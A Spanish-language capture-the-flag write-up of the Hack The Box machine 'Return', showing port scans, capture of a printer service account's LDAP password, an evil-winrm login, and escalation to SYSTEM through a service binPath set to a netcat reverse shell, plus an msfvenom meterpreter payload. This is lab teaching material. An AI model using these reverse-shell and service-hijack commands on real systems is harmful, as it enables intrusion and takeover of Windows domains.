**Return**
-------------------------

1. Escaneo de puertos

```bash
$ sudo nmap -sS -p- --min-rate 5000 -vv 10.10.11.108 -oG allports              
[sudo] password for mili: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 15:22 CEST
Initiating Ping Scan at 15:22
Scanning 10.10.11.108 [4 ports]
Completed Ping Scan at 15:22, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:22
Completed Parallel DNS resolution of 1 host. at 15:22, 0.00s elapsed
Initiating SYN Stealth Scan at 15:22
Scanning 10.10.11.108 (10.10.11.108) [65535 ports]
Completed SYN Stealth Scan at 15:23, 14.18s elapsed (65535 total ports)
Nmap scan report for 10.10.11.108 (10.10.11.108)
Host is up, received echo-reply ttl 127 (0.035s latency).
Scanned at 2024-09-21 15:22:49 CEST for 14s
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
54159/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
           Raw packets sent: 71020 (3.125MB) | Rcvd: 65542 (2.622MB)
```

```bash
$ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694,54159 10.10.11.108 -oN escaneo
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 15:23 CEST
Nmap scan report for 10.10.11.108 (10.10.11.108)
Host is up (0.040s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-21 13:42:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
54159/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-21T13:43:18
|_  start_date: N/A
|_clock-skew: 18m36s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.88 seconds
```

2. Enumerar el servicio SMB

```bash
$ enum4linux -a 10.10.11.108
================================( Getting domain SID for 10.10.11.108 )===============================                                                                           
Domain Name: RETURN                                                                                                                                                                          
Domain Sid: S-1-5-21-3750359090-2939318659-876128439

[+] Host is part of a domain (not a workgroup)
```

Como no permite NULL o sesiones de invitado pasamos la página web.

3. IIS

![image](https://github.com/user-attachments/assets/07eebb5b-5911-47c9-b8b0-f4e673143320)
![image](https://github.com/user-attachments/assets/6e5eb4a8-3048-43db-bbe5-78aa83719af8)

4. Foothold

Estos dispositivos almacenan credenciales LDAP y SMB para que la impresora pueda consultar la lista de usuarios desde Active Directory y guardar los archivos escaneados en una unidad de usuario. Estas páginas de configuración suelen permitir especificar el controlador de dominio o el servidor de archivos. Vamos a crear una escucha en el puerto 389 (LDAP) y especificar nuestra dirección IP tun0 en el campo Dirección del servidor.

Hacemos una escucha
```bash
$ sudo nc -lvp 389
listening on [any] 389 ...
10.10.11.108: inverse host lookup failed: Unknown host
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.108] 59316
0*`%return\svc-printer�
1edFg43012!!

```

La conexión se recive y vemos que aparecen las credenciales de "svc-printer"
El puerto de WinRM está abierto por lo que utilizaremos "evil-winrm"
```bash
$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
   
Evil-WinRM shell v3.5
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
   
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

5. Escalada de privilegios
Enumerando grupos de miembros revelan que svc-printer pertene al grupo de server operators.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/20/2024 8:19:17 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Este grupo puede parar e iniciar servicios de sistema. Vamos a modificar una ruta de binario de servicio para obtener una reverse shell.
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe
   
Info: Uploading /home/mili/Desktop/HTB/Return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
   
Data: 79188 bytes of 79188 bytes copied
   
Info: Upload successful!
----------------------
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.15 4444"
[SC] ChangeServiceConfig SUCCESS
----------------------
```

Ahora iniciamos una escucha en el puerto que hayamos seleccionado:
```bash
$ nc -lvnp 4444                                                                                                                                                        
listening on [any] 4444 ...
```

Y paramos e iniciamos el servicio:
```powershell
Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
```

Y observamos que en nuestro nc se ha establecido conexión:
```bash
$ nc -lvnp 4444                                                                                                                                                        
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.108] 53956
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Esa shell morirá en poco tiempo por lo que podemos usar msfvenom para generar una shell de meterpreter en un archivo para el host remoto de Windows:
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > shell-x86.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

Y la subimos igual que antes con upload.
Y nos vamos a meterpreter con msfconsole.

![image](https://github.com/user-attachments/assets/c2469f7c-79a9-4f12-bb3e-215ba9e6bcc9)
![image](https://github.com/user-attachments/assets/faa9a9b1-0f0d-45ac-9323-75dee1da4a70)

Y ahora modificamos el servicio binario para obtener nuestra shell con la que hemos subido:
![image](https://github.com/user-attachments/assets/9a394d43-c88b-4fb7-aa44-59b9f5594bda)

![image](https://github.com/user-attachments/assets/c3bca298-8938-4418-a7e9-2a94365cd920)

Con migrate conseguimos persistencia al cambiar a un proceso que no suele cerrarse y siempre está activo.
![image](https://github.com/user-attachments/assets/3b1762ee-0360-400f-998b-a5c2a3d581c7)

![image](https://github.com/user-attachments/assets/b31a61dc-7834-4c32-a194-f7d88eb0d6cc)



